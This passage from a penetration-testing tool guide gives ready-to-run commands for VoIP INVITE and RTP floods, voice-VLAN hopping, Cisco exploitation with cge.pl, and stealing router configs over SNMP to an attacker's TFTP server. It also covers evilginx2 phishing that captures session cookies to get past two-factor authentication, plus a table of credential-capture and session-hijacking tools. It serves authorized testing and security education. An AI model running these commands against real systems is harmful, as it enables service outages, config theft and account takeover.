- The file-descriptor limit defaults to 1024; raise it with `ulimit -n` before high concurrency.
- When stress-testing phones/PSTN gateways, ramp `-r` up from low to avoid instantly crippling the voice service.

### inviteflood — SIP/SDP INVITE Flood

**Purpose**: Floods target SIP devices with large numbers of INVITE messages over UDP to test their overload protection.
**Installation**: `sudo apt install inviteflood`
**When to use**: DoS resilience testing of VoIP devices; unlike sipp it is "pure volume" rather than simulating legitimate call flows.

```bash
# 官网示例:eth0 上向 PBIP 灌 100 个 INVITE
inviteflood eth0 5000 example.local 192.168.1.5 100

# 参数:<iface> <user> <domain> <target-ip> <num-packets>
inviteflood <iface> <user> <domain> <target-ip> <count>
```

**Practical tips**:
- The default target port is 5060/UDP; even small packet counts noticeably affect small PBXes — start small.
- Pair with iaxflood (the IAX protocol version) to cover both signaling stacks.

### voiphopper — VoIP VLAN Hopping Test

**Purpose**: Discovers the voice VLAN via CDP/LLDP/DHCP and joins it like an IP phone, verifying whether a data port can slip into the voice segment.
**Installation**: `sudo apt install voiphopper`
**When to use**: When you see a phone + switch voice VLAN architecture on the intranet, run the VLAN hopping test first before moving to the VoIP attack phase.

```bash
# 官网示例:评估模式(嗅探 ARP 学习网段)
voiphopper -i eth0 -z

# 模拟 Cisco IP 电话经 CDP 加入语音 VLAN
voiphopper -i eth0 -c 1

# 辅助:-l 列出可用接口;-m 伪造 MAC 后退出;-d 删除已建 VLAN 子接口
voiphopper -l
```

**Practical tips**:
- On success it creates an `eth0.<vlan-id>` subinterface and obtains a voice-segment IP; run svmap/sippts directly afterwards.
- The correct defense is voice-port binding on the switch/802.1X+MAB; if a data port can also learn the voice VLAN, that is a finding.

### cisco-torch — Fast Cisco Device Scanner

**Purpose**: Multi-process fork-based concurrent scanning that identifies Telnet/SSH/Web/NTP/TFTP/SNMP services on remote Cisco devices and supports dictionary attacks against discovered services (SNMP communities, TFTP config filename brute force).
**Installation**: `sudo apt install cisco-torch`
**When to use**: When you have a large network range and need to quickly locate Cisco devices and map management-plane exposure; speed is its core advantage over cisco-ocs.

```bash
# 官网示例:对目标跑全部扫描类型
cisco-torch -A <target-ip>

# 扫描目标列表文件
cisco-torch -F <targets-file>
```

**Practical tips**:
- Configured through torch.conf; it warns when a fingerprint database is missing (e.g. Telnet fingerprint.db) — a normal alert.
- Finding `WWW-Authenticate: Basic realm="level_15_access"` means the IOS web management plane is exposed; move on to cge.pl to attempt exploitation.

### copy-router-config.pl / merge-router-config.pl — SNMP Pull/Write-Back of Cisco Configs

**Purpose**: Uses a writable SNMP community to pull the Cisco router config to the attacking machine via TFTP (copy), or push a modified config back to the device (merge).
**Installation**: `sudo apt install copy-router-config`
**When to use**: Config theft and config injection after obtaining an rw community (via onesixtyce/snmp brute force, etc.); one operation hands you every device key.

```bash
# 1. 攻击机起 TFTP 服务(建议根目录 /tmp)
atftpd --daemon /tmp

# 2. 把路由器配置拉到本机(官网示例参数顺序)
copy-router-config.pl <router-ip> <tftp-server-ip> <community>
# 例:copy-router-config.pl 192.168.1.1 192.168.1.15 private

# 3. 编辑配置后推回路由器
merge-router-config.pl <router-ip> <tftp-server-ip> <community>
```

**Practical tips**:
- An rw community is required — ro fails; enable secret/type-7 keys in the config can be cracked offline (see the password domain document for the approach).
- The pulled file lands in the TFTP root; shut down atftpd afterwards to avoid leaving a backdoor service.
- Running merge against a production device directly changes its config; prefer forensics only (copy), and write back only with the client's explicit consent.

### cge.pl — Cisco Global Exploiter

**Purpose**: A Cisco exploitation tool with a built-in numbered vulnerability list; triggers the matching old vulnerability on the target by number.
**Installation**: `sudo apt install cisco-global-exploiter`
**When to use**: After cisco-torch finds targets, quickly verify by fingerprint-matched number whether known vulnerabilities are still exposed.

```bash
# 官网示例:利用 [3] IOS HTTP Auth 漏洞
cge.pl 192.168.99.230 3

# 通用形式
cge.pl <target-ip> <vuln-number>
```

**Practical tips**:
- Commonly used numbers (official help): 1=677/678 Telnet buffer overflow, 2=IOS Router DoS, 3=IOS HTTP Auth, 4=IOS HTTP config arbitrary admin access, 5=Catalyst SSH protocol mismatch DoS, 6=675 web management DoS.
- Aimed at old IOS (the 12.x era); modern devices are essentially immune — a hit means the device is badly overdue for maintenance.
- Numbers 2/5/6 are destructive DoS; choose carefully within the authorized scope.

### evilginx2 — Phishing-Style MITM Framework (2FA Bypass)

**Purpose**: Ships its own HTTP+DNS servers and stands between the victim and the real site as a reverse proxy, capturing credentials and session cookies at the same time to bypass SMS/TOTP two-factor authentication.
**Installation**: `sudo apt install evilginx2`
**When to use**: Authorized social engineering drills: when you must prove "phishing + session hijacking can bypass two-factor"; compared with a hand-rolled mitmproxy reverse proxy, it has built-in phishlet interception rules and session management.

```bash
sudo evilginx2 -p <phishlets-dir>

# 交互式命令:
config domain <domain>
config ip <attacker-ip>
phishlets enable <name>
phishlets hostname <name> <domain>
lures create <name>       # 生成钓鱼链接
sessions                  # 查看捕获的会话 Cookie
```

**Practical tips**:
- Requires a controllable domain + certificate (automatic ACME) and inbound 80/443; local experiments can use hosts + a self-signed certificate.
- Phishlets are configurations written per target site; the repo ships templates for common sites, custom targets must be written yourself.
- Report conclusions should land on "detection + anti-hijacking (FIDO2, anomalous-session alerting)" rather than merely the credential leak itself.

## Remaining Tools — Quick Reference

| Tool | One-line purpose | Package | Most common command |
|---|---|---|---|
| 0trace.sh | Traceroute inside an established TCP connection, bypassing stateful packet filtering | 0trace | `0trace.sh <iface> <target-ip> [port]` |
| above | Purely passive sniffing to discover network device vulnerabilities (discovery protocols/FHRP/STP/LLMNR, etc., zero noise) | above | `sudo above -i eth0 -f <logfile>` |
| arping | Sends ARP or ICMP pings to an IP/MAC for alive checks | arping | `sudo arping -c 3 <ip>` |
| arpwatch | Monitors segment MAC/IP changes and alerts by email (detects ARP spoofing) | arpwatch | `sudo arpwatch -i eth0` |
| cisco-ocs | Batch-scans IP ranges for exploitable Cisco devices | cisco-ocs | `cisco-ocs <start-ip> <end-ip>` |
| darkstat | Background traffic statistics with web reports | darkstat | `sudo darkstat -i eth0` |
| enumiax | IAX protocol username enumeration/brute force | enumiax | `enumiax -d <wordlist> <target>` |
| ferret-sidejack | Extracts cookies and other session data from traffic (fed to hamster) | ferret-sidejack | `ferret-sidejack -i eth0` |
| fiked | Fake IKE daemon impersonating a Cisco VPN gateway to capture XAUTH credentials | fiked | `fiked -g <gateway-ip> -k <group-id>:<psk>` (optional `-l <file>` to log credentials) |
| firewalk | Probes which layer-4 protocols/ports a gateway ACL will allow through | firewalk | `firewalk -S<ports> -i eth0 -n -pTCP <gateway-ip> <target-ip>` |
| fluxion | WPA/WPA2 phishing (rogue AP to trick out passwords) social engineering audit | fluxion | `sudo fluxion` |
| fping | Polling-style parallel ICMP ping, supports CIDR/file targets | fping | `fping -g <cidr>` |
| fragrouter | IDS-evasion traffic shaping (8 modes including fragmentation) | fragrouter | `fragrouter -i eth0 -F1` |
| hamster-sidejack | Local proxy that hijacks sessions with cookies stolen by ferret (127.0.0.1:1234) | hamster-sidejack | `hamster` |
| hexinject | Hex-level raw packet injection/sniffing framework (includes prettypacket/hex2raw/packets.tcl) | hexinject | `hexinject -s -i eth0` |
| httrack | Offline website mirroring (phishing pages/information-gathering material) | httrack | `httrack <url> -O <dir>` |
| iaxflood | IAX (Asterisk) protocol UDP flood | iaxflood | `iaxflood <src-ip> <dst-ip> <count>` |
| intrace | Enumerates IP hops via existing TCP connections (firewall-bypass recon) | intrace | `intrace -h <host> -p <port> -s <size>` |
| iputils-arping | The iputils-packaged version of arping (same binary) | arping | `sudo arping -c 3 <ip>` |
| macchanger | Views/forges NIC MAC addresses | macchanger | `sudo macchanger -r eth0` (random) / `-m <mac> eth0` |
| netdiscover | ARP-based active/passive host discovery | netdiscover | `sudo netdiscover -r <cidr>` (passive `-p`) |
| netmask | Computes the minimal set of netmasks for an address range | netmask | `netmask <ip>/<bits>` |
| netsniff-ng | Zero-copy high-performance capture suite (loss-sensitive scenarios) | netsniff-ng | `netsniff-ng --in eth0 --out <file>.pcap` |
| ohrwurm | RTP fuzzing (paired with arpspoof for phone MITM) | ohrwurm | `ohrwurm -a <ipA> -b <ipB> -A <portA> -B <portB> -i eth0` |
| p0f | Passive OS fingerprinting (zero packets sent, SYN-based) | p0f | `p0f -i eth0 -p -o <logfile>` |
| protos-sip | SIP implementation robustness test suite (Java) | protos-sip | `protos-sip -touri <user>@<domain>` |
| rtpbreak | Detects/reassembles/analyzes RTP sessions; output can be processed with sox/wireshark | rtpbreak | `rtpbreak -i eth0 -g -m -d <outdir>` |
| rtpflood | Packet-flood stress test for RTP-processing devices | rtpflood | `rtpflood <src> <dst> <sport> <dport> <count> <seq> <ts> <ssid>` |
| rtpinsertsound | Inserts pre-recorded audio into a chosen RTP stream | rtpinsertsound | `rtpinsertsound /usr/share/rtpinsertsound/stapler.wav -v` |
| rtpmixsound | Mixes pre-recorded audio into the target RTP stream in real time | rtpmixsound | `rtpmixsound /usr/share/rtpmixsound/stapler.wav -v` |
| sara | MikroTik RouterOS config/CVE auditing | sara | `sudo sara audit <ip> <user> <profiles>` (password entered interactively at runtime) |
| siege | HTTP regression stress testing/benchmarking (concurrent user simulation) | siege | `siege -c 50 -t 1M <url>` |
| siparmyknife | SIP fuzzing (XSS/SQLi/format string/overflow probing) | siparmyknife | `siparmyknife -h` (interactive configuration) |
| sipsak | Small SIP utility (probing/tracing/stress/forged requests) | sipsak | `sipsak -vv -s sip:<user>@<host>` |
| sniffjoke | Transparently scrambles your own TCP streams so passive eavesdropping/IDS cannot easily reconstruct them | sniffjoke | `sniffjoke -h` (pair with sj-iptcpopt-probe pre-check) |
| ssldump | SSLv3/TLS traffic analyzer (decryptable when keying material is available) | ssldump | `ssldump -i eth0` (offline `-r <file>.pcap`) |
| sslsniff | Vintage SSL/TLS MITM tool with dynamically generated per-domain certificates (includes null-prefix/OCSP attacks) | sslsniff | `sslsniff -a -s 8443 -c <cert.pem>` |
| tcpreplay | Replays pcaps at a chosen rate (for testing NIDS/devices) | tcpreplay | `tcpreplay -i eth0 <file>.pcap` |
| termineter | Smart meter security testing framework (C12.18/C12.19 optical port) | termineter | `sudo termineter` (interactive, `show modules` lists modules) |

---

All technical content in this document is intended solely for penetration testing, CTF competition, and security education scenarios that have obtained written authorization; it is strictly forbidden in any unauthorized environment.
